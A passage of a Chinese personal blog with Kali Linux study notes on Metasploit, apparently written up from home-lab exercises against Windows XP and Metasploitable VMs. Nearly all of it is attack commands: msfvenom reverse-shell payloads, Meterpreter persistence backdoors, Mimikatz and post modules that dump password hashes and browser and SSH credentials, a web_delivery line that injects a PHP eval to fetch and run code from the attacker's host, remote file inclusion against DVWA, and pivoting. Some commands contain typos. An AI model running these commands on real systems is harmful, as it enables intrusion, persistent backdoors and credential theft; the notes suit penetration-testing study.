<li><a href="https://github.com/rsmudge/cortana-scripts" target="_blank" rel="noopener">https://github.com/rsmudge/cortana-scripts</a></li>
</ul>
</li>
<li>别无他法的的最后选择<ul>
<li>Attacks<ul>
<li>Find Attacks   # 自动分析匹配漏洞利用模块（智能分析分配模块的尝试）</li>
<li>Hail Mary #上帝啊！赐于我力量吧！（端口进行所有模块的尝试，Great级别以上）</li>
<li>洪水式漏洞利用代码执行，流量及特征明显，容易被发现</li>
</ul>
</li>
</ul>
</li>
<li>Armitage现状<ul>
<li>维护不及时，传言此项目已荒废</li>
<li>仍然式目前唯一开源免费的metasploit图形前端</li>
</ul>
</li>
<li>Cobalt Strike</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/04/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E4%B8%80%E5%8D%81%E4%BA%8C)%EF%BC%9AMSF%E5%BB%B6%E5%B1%95%E7%94%A8%E6%B3%95/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/03/04/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E4%B8%80%E5%8D%81%E4%BA%8C)%EF%BC%9AMSF%E5%BB%B6%E5%B1%95%E7%94%A8%E6%B3%95/" itemprop="url">Kali Linux笔记(一百一十二)：MSF延展用法</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-04T11:42:32+08:00">
                2020-03-04
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  1.5k 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  6 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-MSF延展用法–Meterpreter后门"><a href="#1-MSF延展用法–Meterpreter后门" class="headerlink" title="1. MSF延展用法–Meterpreter后门"></a>1. MSF延展用法–Meterpreter后门</h4><ul>
<li>持久后门<ul>
<li>利用漏洞取得的meterpreter shell运行于内存，重启失效</li>
<li>重复exploit漏洞可能造成服务崩溃</li>
<li>持久后门保证漏洞修复后仍可远程控制</li>
</ul>
</li>
<li>Meterpreter后门–metsvc<ul>
<li>▲ metsvc不能改端口，不支持身份验证</li>
<li><strong><code>🔺命令：run metsvc -h</code></strong> <ul>
<li>-A：自动启动/exploit/multi/handle监听</li>
<li>-r：删除监听</li>
</ul>
</li>
<li><strong><code>🔺命令：use exploit/multi/handler</code></strong>  </li>
<li><strong><code>🔺命令：set PAYLOAD windows/metsvc_bind_tcp</code></strong>  <ul>
<li><strong><code>🔺命令：set LPORT 31337</code></strong>  </li>
</ul>
</li>
<li><strong><code>🔺命令：set RHOST 1.1.1.1</code></strong> </li>
</ul>
</li>
<li>Meterpreter后门–persistence<ul>
<li>▲ 添加VBS脚本，并在注册表添加启动项</li>
<li><strong><code>🔺命令：run persistence -h</code></strong> <ul>
<li>默认使用windows/meterprter/reverse_tcp</li>
<li>-X：自动启动agent当机器开机</li>
<li>-r：要连接的IP</li>
<li>-p：要连接的端口</li>
</ul>
</li>
<li><strong><code>🔺命令：run persistence -X -i 10 -p 4444 -r 1.1.1.1</code></strong>  </li>
<li><strong><code>🔺命令：run persistence -U -i 20 -p 4444 -r 1.1.1.1</code></strong>  </li>
<li><strong><code>🔺命令：run persistence -S -i 20 -p 4444 -r 1.1.1.1</code></strong> </li>
</ul>
</li>
</ul>
<h4 id="2-MSF延展用法–Mimikatz"><a href="#2-MSF延展用法–Mimikatz" class="headerlink" title="2. MSF延展用法–Mimikatz"></a>2. MSF延展用法–Mimikatz</h4><ul>
<li>hashdump使用的就是Minikatz的部分功能<ul>
<li><strong><code>🔺命令：getsystem</code></strong>  </li>
<li><strong><code>🔺命令：load mimikatz</code></strong>  </li>
<li>wdigest、kerberos、msv、ssp、tspkg、livessp<ul>
<li>msv：账号加密信息</li>
<li>ssp：账号不加密信息</li>
<li>tspkg：kerveros身份票据信息</li>
<li>wdigest：从内存中获取账号明文密码</li>
<li>kerboros：从内存中获取账号明文密码</li>
</ul>
</li>
<li><strong><code>🔺命令：mimikatz_command -h</code></strong>  <ul>
<li>-a：使用具体模块所需要的子参数</li>
<li>-f：使用的模块</li>
</ul>
</li>
<li>查看模块（使用不存在模块，报错显示）：<strong><code>🔺命令：mimikatz_command -f a::</code></strong>  </li>
<li>查看系统账号哈希：<strong><code>🔺命令：mimikatz_command -f samdump::hashes</code></strong></li>
<li>查看操作系统进程：<strong><code>🔺命令：mimikatz_command -f handle::list</code></strong> </li>
<li>查看操作系统服务：<strong><code>🔺命令：mimikatz_command -f service::list</code></strong> </li>
<li>查看操作系统支持的加密：<strong><code>🔺命令：mimikatz_command -fcrypto::listProviders</code></strong> </li>
<li>查看地雷雷数：<strong><code>🔺命令：mimikatz_command -f winmine::infos</code></strong><ul>
<li>▲ winmine：扫雷游戏</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="3-MSF延展用法–PHP-shel-Web-Delivery"><a href="#3-MSF延展用法–PHP-shel-Web-Delivery" class="headerlink" title="3. MSF延展用法–PHP shel/Web Delivery"></a>3. MSF延展用法–PHP shel/Web Delivery</h4><ul>
<li>PHP shell<ul>
<li><strong><code>🔺命令：msfvenom -p php/meterpreter/reverse_tcp LHOST=1.1.1.1 LPORT=3333 -f raw -o a.php</code></strong></li>
<li>MSF启动侦听</li>
<li>上传到web站点并通过浏览器访问<ul>
<li>Web Delivery</li>
<li>利用代码执行漏洞访问攻击者服务器，从攻击者服务器下载远程执行代码，执行下载的代码后反弹一个shell给攻击者的服务器</li>
<li><strong><code>🔺命令：use exploit/multi/script/web_delivery</code></strong> </li>
<li><strong><code>🔺命令：set target 1</code></strong> </li>
<li><strong><code>🔺命令：;php -d allow_url_fopen=true -r “eval(file_get_contents(‘http://1.1.1.1/ fTYWqmu&#39;));&quot;</code></strong></li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="4-MSF延展用法–RFI远程文件包含"><a href="#4-MSF延展用法–RFI远程文件包含" class="headerlink" title="4. MSF延展用法–RFI远程文件包含"></a>4. MSF延展用法–RFI远程文件包含</h4><ul>
<li><strong><code>🔺命令：vi /etc/php5/cgi/php.ini</code></strong><ul>
<li>allow_url_fopen = On </li>
<li>allow_url_include = On </li>
</ul>
</li>
<li><strong><code>🔺命令：use exploit/unix/webapp/php_include</code></strong> </li>
<li><strong><code>🔺命令：set RHOST 1.1.1.2</code></strong> </li>
<li><strong><code>🔺命令：set PATH /dvwa/vulnerabilities/fi/</code></strong> </li>
<li><strong><code>🔺命令：set PHPURI /?page=XXpathXX</code></strong> </li>
<li><strong><code>🔺命令：set HEADERS &quot;Cookie:security=low; PHPSESSID=eefcf023ba61219d4745ad7487fe81d7&quot;</code></strong> </li>
<li><strong><code>🔺命令：set payload php/meterpreter/reverse_tcp</code></strong></li>
<li><strong><code>🔺命令：set lhost 1.1.1.1 – exploit</code></strong></li>
</ul>
<h4 id="5-实验准备"><a href="#5-实验准备" class="headerlink" title="5. 实验准备"></a>5. 实验准备</h4><ul>
<li>Kali<ul>
<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
<li><strong><code>🔺命令：msfvenom -p windows/meterpreter/reverse_tcp LHOST=Window XP的IP LPORT=4444 -a x86 --platform windows -b &#39;\x00\xff&#39; -e x86/shikata_ga -f exe a.exe</code></strong></li>
<li><strong><code>🔺命令：cp a.exe /var/www/html</code></strong></li>
<li><strong><code>🔺命令：service apache2 start</code></strong></li>
<li><strong><code>🔺命令：msfconsole -q</code></strong><ul>
<li><strong><code>🔺命令：use exploit/multi/handle</code></strong><ul>
<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong><ul>
<li><strong><code>🔺命令：set LHOST Kali的IP地址</code></strong></li>
</ul>
</li>
<li><strong><code>🔺命令：set exitonsession false</code></strong>（退出session继续监听）</li>
<li><strong><code>🔺命令：exploit -j -z</code></strong></li>
</ul>
</li>
<li><strong><code>🔺命令：jobs</code></strong><ul>
<li>查看job是否一直有任务</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Window XP SP3<ul>
<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址，关闭防火墙</li>
<li>浏览器访问<a href="http://Kali的IP地址/a.exe，下载a.exe" target="_blank" rel="noopener">http://Kali的IP地址/a.exe，下载a.exe</a></li>
<li>执行a.exe</li>
<li>查看是否拿到shell</li>
<li><strong><code>🔺命令：getuid</code></strong></li>
</ul>
</li>
<li>Metasploit<ul>
<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
</ul>
</li>
</ul>
<h4 id="6-实验–metsvc"><a href="#6-实验–metsvc" class="headerlink" title="6. 实验–metsvc"></a>6. 实验–metsvc</h4><ul>
<li>Kali<ul>
<li><strong><code>🔺命令：session -i 1</code></strong></li>
<li><strong><code>🔺命令：run metsvc -h</code></strong></li>
<li><strong><code>🔺命令：run metsvc -A</code></strong>（31337）</li>
<li>查看是否拿到shell</li>
<li>在window 7的计算机管理查看是否开启服务meterpreter → metsvc</li>
<li><strong><code>🔺命令：use exploit/multi/handler</code></strong> <ul>
<li><strong><code>🔺命令：set PAYLOAD windows/metsvc_bind_tcp</code></strong> <ul>
<li><strong><code>🔺命令：set LPORT 31337</code></strong></li>
</ul>
</li>
<li><strong><code>🔺命令：set RHOST Window XP的IP</code></strong></li>
<li><strong><code>🔺命令：exploit</code></strong></li>
</ul>
</li>
<li>▲ 2020.03.04 能够正常执行，但因为XP无法重新启动，所以最后的shell无法验证</li>
</ul>
</li>
</ul>
<h4 id="7-实验–persistence"><a href="#7-实验–persistence" class="headerlink" title="7. 实验–persistence"></a>7. 实验–persistence</h4><ul>
<li>Kali<ul>
<li><strong><code>🔺命令：session -i 1</code></strong></li>
<li><strong><code>🔺命令：run persistence -h</code></strong></li>
<li><strong><code>🔺命令：run persistence -X -p 4444 -r Window XP的IP</code></strong></li>
<li><strong><code>🔺命令：background</code></strong></li>
<li><strong><code>🔺命令：set payload windows/meterprter/reverse_tcp</code></strong><ul>
<li><strong><code>🔺命令：set LHOST Window XP的IP</code></strong></li>
<li><strong><code>🔺命令：set LPORT 4444</code></strong><ul>
<li><strong><code>🔺命令：set exitonsession false</code></strong></li>
<li><strong><code>🔺命令：exploit -j -z</code></strong></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Window XP SP3<ul>
<li>重新启动</li>
</ul>
</li>
<li>Kali<ul>
<li>查看是否拿到shell</li>
</ul>
</li>
<li>▲ 2020.03.04 能够正常执行，但因为XP无法重新启动，所以最后的shell无法验证</li>
</ul>
<h4 id="8-实验–Mimikatz"><a href="#8-实验–Mimikatz" class="headerlink" title="8. 实验–Mimikatz"></a>8. 实验–Mimikatz</h4><ul>
<li>Kali<ul>
<li><strong><code>🔺命令：session -i 1</code></strong></li>
<li><strong><code>🔺命令：getsystem</code></strong></li>
<li><strong><code>🔺命令：load mimikatz</code></strong> </li>
<li><strong><code>🔺命令：mimikatz_command -h</code></strong> </li>
<li><strong><code>🔺命令：mimikatz_command -f a::</code></strong> </li>
<li><strong><code>🔺命令：mimikatz_command -f samdump::hashes</code></strong> </li>
<li><strong><code>🔺命令：mimikatz_command -f handle::list</code></strong> </li>
<li><strong><code>🔺命令：mimikatz_command -f service::list</code></strong> </li>
<li><strong><code>🔺命令：mimikatz_command -f crypto::listProviders</code></strong> </li>
<li><strong><code>🔺命令：mimikatz_command -f winmine::infos</code></strong></li>
</ul>
</li>
</ul>
<h4 id="9-实验–PHP-shell"><a href="#9-实验–PHP-shell" class="headerlink" title="9. 实验–PHP shell"></a>9. 实验–PHP shell</h4><ul>
<li>Kali<ul>
<li><strong><code>🔺命令：msfvenom -p php/meterpreter/reverse_tcp LHOST=Kali的IP LPORT=3333 -f raw -o a.php</code></strong> </li>
<li><strong><code>🔺命令：scp a.php msfadmin@Metasploit的IP:/home/msfadmin</code></strong></li>
<li><strong><code>🔺命令：msfconsole -q</code></strong><ul>
<li><strong><code>🔺命令：use exploit/multi/handle</code></strong><ul>
<li><strong><code>🔺命令：set payload php/meterpreter/reverse_tcp</code></strong><ul>
<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
<li><strong><code>🔺命令：set LPORT 3333</code></strong></li>
<li><strong><code>🔺命令：exploit -j -z</code></strong></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Metasploit<ul>
<li><strong><code>🔺命令：sudo cp a.php /var/www</code></strong></li>
<li><strong><code>🔺命令：ls /var/www</code></strong>（查看是否已经复制）</li>
</ul>
</li>
<li>Kali<ul>
<li>浏览器访问<a href="http://Metasploit的IP/a.php" target="_blank" rel="noopener">http://Metasploit的IP/a.php</a></li>
<li>查看是否拿到shell</li>
<li><strong><code>🔺命令：session -i 1</code></strong></li>
<li><strong><code>🔺命令：getuid</code></strong></li>
</ul>
</li>
</ul>
<h4 id="10-实验–Web-Delivery"><a href="#10-实验–Web-Delivery" class="headerlink" title="10. 实验–Web Delivery"></a>10. 实验–Web Delivery</h4><ul>
<li>Kali<ul>
<li><strong><code>🔺命令：use exploit/multi/script/web_delivery</code></strong><ul>
<li><strong><code>🔺命令：set URIPATH /</code></strong></li>
<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
<li><strong><code>🔺命令：set LPORT 4444</code></strong></li>
<li><strong><code>🔺命令：set target 1</code></strong>（PHP）</li>
<li><strong><code>🔺命令：set payload php/meterpreter/reverse_tcp</code></strong><ul>
<li><strong><code>🔺命令：exploit -j -z</code></strong></li>
</ul>
</li>
</ul>
</li>
<li>浏览器访问<a href="http://Metasploit的IP，访问DVWA" target="_blank" rel="noopener">http://Metasploit的IP，访问DVWA</a></li>
<li>设置安全级别为低</li>
<li>在Cmomand Exection中执行生成的命令行<strong><code>🔺命令：;php -d allow url fopen=true -r &quot;eval(file get contents(&#39;http://Kali的IP:8080/&#39;));&quot;</code></strong></li>
<li>查看是否拿到shell</li>
<li><strong><code>🔺命令：session -i 1</code></strong></li>
<li><strong><code>🔺命令：getuid</code></strong></li>
</ul>
</li>
</ul>
<h4 id="11-实验–RFI远程文件包含"><a href="#11-实验–RFI远程文件包含" class="headerlink" title="11. 实验–RFI远程文件包含"></a>11. 实验–RFI远程文件包含</h4><ul>
<li>Kali<ul>
<li>浏览器访问<a href="http://Metasploit的IP/dvwa，把安全级别设置为低，本地文件包含测试" target="_blank" rel="noopener">http://Metasploit的IP/dvwa，把安全级别设置为低，本地文件包含测试</a></li>
</ul>
</li>
<li>Metasploit<ul>
<li><strong><code>🔺命令：vi /etc/php5/cgi/php.ini</code></strong><ul>
<li>allow_url_fopen = On </li>
<li>allow_url_include = On</li>
</ul>
</li>
<li><strong><code>🔺命令：sudo /etc/init.d apache2 restart</code></strong></li>
</ul>
</li>
<li>Kali<ul>
<li>浏览器访问<a href="http://Metasploit的IP/dvwa/?page=http://www.163.com/index.php" target="_blank" rel="noopener">http://Metasploit的IP/dvwa/?page=http://www.163.com/index.php</a> ，远程文件包含测试</li>
<li><strong><code>🔺命令：msfconsole -q</code></strong><ul>
<li><strong><code>🔺命令：use exploit/unix/webapp/php_include</code></strong> <ul>
<li><strong><code>🔺命令：set RHOST Metasploit的IP</code></strong> </li>
<li><strong><code>🔺命令：set PATH /dvwa/vulnerabilities/fi/</code></strong> </li>
<li><strong><code>🔺命令：set PHPURI /?page=XXpathXX</code></strong> </li>
<li><strong><code>🔺命令：set HEADERS &quot;Cookie:security=low; PHPSESSID=eefcf023ba61219d4745ad7487fe81d7&quot;</code></strong> </li>
<li><strong><code>🔺命令：set payload php/meterpreter/reverse_tcp</code></strong> <ul>
<li><strong><code>🔺命令：set lhost Kali的IP</code></strong> </li>
<li><strong><code>🔺命令：exploit</code></strong></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>查看是否能直接拿到shell</li>
<li><strong><code>🔺命令：session -i 1</code></strong></li>
<li><strong><code>🔺命令：getuid</code></strong></li>
<li>▲ 2020.03.04 Exploit completed,but no session was created</li>
</ul>
</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/04/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E4%B8%80%E5%8D%81%E4%B8%80)%EF%BC%9AMSF%E6%A8%A1%E5%9D%97--Post/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/03/04/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E4%B8%80%E5%8D%81%E4%B8%80)%EF%BC%9AMSF%E6%A8%A1%E5%9D%97--Post/" itemprop="url">Kali Linux笔记(一百一十一)：MSF模块--Posting</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-04T11:40:08+08:00">
                2020-03-04
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  643 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  3 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-POST模块"><a href="#1-POST模块" class="headerlink" title="1. POST模块"></a>1. POST模块</h4><ul>
<li>ARP扫描：<strong><code>🔺命令：run post/windows/gather/arp_scanner RHOSTS=2.1.1.0/24</code></strong> </li>
<li>虚拟机检测：<strong><code>🔺命令：run post/windows/gather/checkvm</code></strong> </li>
<li>身份信息收集：<strong><code>🔺命令：run post/windows/gather/credentials/credential_collector</code></strong> </li>
<li>枚举应用程序：<strong><code>🔺命令：run post/windows/gather/enum_applications</code></strong> </li>
<li>枚举目标机器账号登陆：<strong><code>🔺命令：run post/windows/gather/enum_logged_on_users</code></strong> </li>
<li>枚举SNMP服务：<strong><code>🔺命令：run post/windows/gather/enum_snmp</code></strong> </li>
<li>本地存在漏洞：<strong><code>🔺命令：run post/multi/recon/local_exploit_suggester</code></strong> </li>
<li>删除用户账号：<strong><code>🔺命令：run post/windows/manage/delete_user USERNAME=yuanfh</code></strong> </li>
<li>运行环境变量信息：<strong><code>🔺命令：run post/multi/gather/env</code></strong> </li>
<li>收集firefox保存的浏览器的账号密码：<strong><code>🔺命令：run post/multi/gather/firefox_creds</code></strong> </li>
<li>ssh登陆信息：<strong><code>🔺命令：run post/multi/gather/ssh_creds</code></strong> </li>
<li>检查目标机器程序是否恶意程序：<strong><code>🔺命令：run post/multi/gather/check_malware REMOTEFILE=c:\\a.exe</code></strong>（上传到各大查杀网站）</li>
</ul>
<h4 id="2-实验准备–POST模块"><a href="#2-实验准备–POST模块" class="headerlink" title="2. 实验准备–POST模块"></a>2. 实验准备–POST模块</h4><ul>
<li>Kali<ul>
<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
<li><strong><code>🔺命令：msfvenom -p windows/meterpreter/reverse_tcp LHOST=Kali的IP LPORT=4444 -a x86 --platform windows -b &#39;\x00&#39; -e x86/shikata_ga_nai -f exe -o a.exe</code></strong></li>
<li><strong><code>🔺命令：cp a.exe /var/www/html</code></strong></li>
<li><strong><code>🔺命令：service apache2 start</code></strong></li>
<li><strong><code>🔺命令：msfconsole -q</code></strong><ul>
<li><strong><code>🔺命令：use exploit/multi/handle</code></strong><ul>
<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong><ul>
<li><strong><code>🔺命令：set LHOST Kali的IP地址</code></strong></li>
</ul>
</li>
<li><strong><code>🔺命令：set exitonsession false</code></strong>（退出session继续监听）</li>
<li><strong><code>🔺命令：exploit -j -z</code></strong></li>
</ul>
</li>
<li><strong><code>🔺命令：jobs</code></strong><ul>
<li>查看job是否一直有任务</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Window XP SP3<ul>
<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址，关闭防火墙</li>
<li>浏览器访问<a href="http://Kali的IP地址/a.exe，下载a.exe" target="_blank" rel="noopener">http://Kali的IP地址/a.exe，下载a.exe</a></li>
<li>执行a.exe</li>
<li>查看是否拿到shell</li>
<li><strong><code>🔺命令：getuid</code></strong></li>
</ul>
</li>
</ul>
<h4 id="3-实验–POST模块"><a href="#3-实验–POST模块" class="headerlink" title="3. 实验–POST模块"></a>3. 实验–POST模块</h4><ul>
<li>Kali<ul>
<li><strong><code>🔺命令：session -i 1</code></strong><ul>
<li><strong><code>🔺命令：run post/windows/gather/arp_scanner RHOSTS=2.1.1.0/24</code></strong></li>
<li><strong><code>🔺命令：run post/windows/gather/checkvm</code></strong> </li>
<li><strong><code>🔺命令：run post/windows/gather/credentials/credential_collector</code></strong></li>
<li><strong><code>🔺命令：run post/windows/gather/enum_applications</code></strong></li>
<li><strong><code>🔺命令：run post/windows/gather/enum_logged_on_users</code></strong></li>
<li><strong><code>🔺命令：run post/windows/gather/enum_snmp</code></strong></li>
<li><strong><code>🔺命令：run post/multi/recon/local_exploit_suggester</code></strong></li>
<li><strong><code>🔺命令：run post/windows/manage/delete_user USERNAME=yuanfh</code></strong></li>
<li><strong><code>🔺命令：run post/multi/gather/env</code></strong> </li>
<li><strong><code>🔺命令：run post/multi/gather/firefox_creds</code></strong> </li>
<li><strong><code>🔺命令：run post/multi/gather/ssh_creds</code></strong> </li>
<li><strong><code>🔺命令：run post/multi/gather/check_malware REMOTEFILE=c:\\a.exe</code></strong><ul>
<li>▲ 2020.03.04 The requests resource is not among the finished,queued or pending scans，猜测上不了VT网站的原因</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="4-自动执行脚本"><a href="#4-自动执行脚本" class="headerlink" title="4. 自动执行脚本"></a>4. 自动执行脚本</h4><ul>
<li><strong><code>🔺命令：use exploit/multi/handle</code></strong></li>
<li>▲ AutoRunScript每次只允许指定一项</li>
<li>自动执行meterpreter脚本<ul>
<li><strong><code>🔺命令：show Advanced</code></strong>（高级选项）<ul>
<li>迁移到指定进程：<strong><code>🔺命令：set AutoRunScript migrate -n explorer.exe</code></strong></li>
<li>编辑目标机器的HOST文件：<strong><code>🔺命令：set AutoRunScript hostsedit -e 1.1.1.1,www.baidu.com</code></strong></li>
<li><strong><code>🔺命令：set InitialAutoRunScript checkvm</code></strong> </li>
</ul>
</li>
</ul>
</li>
<li>自动执行post模块<ul>
<li><strong><code>🔺命令：show Advanced</code></strong>（高级选项）<ul>
<li><strong><code>🔺命令：set InitialAutoRunScript migrate -n explorer.exe</code></strong> </li>
<li><strong><code>🔺命令：set AutoRunScript post/windows/gather/dumplinks</code></strong>（前提：需提前把自己<strong><code>🔺命令：migrate</code></strong>到目标用户上）</li>
</ul>
</li>
</ul>
</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/04/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E4%B8%80%E5%8D%81)%EF%BC%9AMSF%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--Pivoting%E9%9A%A7%E9%81%93/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/03/04/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E4%B8%80%E5%8D%81)%EF%BC%9AMSF%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--Pivoting%E9%9A%A7%E9%81%93/" itemprop="url">Kali Linux笔记(一百一十)：MSF后渗透测试--Pivoting隧道</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-04T00:18:58+08:00">
                2020-03-04
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  1k 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  4 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-Pivoting跳板-枢纽-支点"><a href="#1-Pivoting跳板-枢纽-支点" class="headerlink" title="1. Pivoting跳板 / 枢纽 / 支点"></a>1. Pivoting跳板 / 枢纽 / 支点</h4><ul>
<li>利用已经控制的一台计算机作为入侵内网的跳板</li>
<li>在其他内网计算机看来访问全部来自于跳板机</li>
<li><strong><code>🔺命令：run autoroute -s 1.1.1.0/24</code></strong>  #不能访问外网的被攻击目标内网网段<ul>
<li>▲ 再深一层的内网，也可以使用，比如Window 7双网卡，第一块网卡接防火墙，第二块网卡接更深一层的私网，且不可路由</li>
</ul>
</li>
</ul>
<h4 id="2-实验–Pivoting自动路由"><a href="#2-实验–Pivoting自动路由" class="headerlink" title="2. 实验–Pivoting自动路由"></a>2. 实验–Pivoting自动路由</h4><ul>
<li>Mono 1<ul>
<li>网卡1模式为Host-only-2模式，检查网络</li>
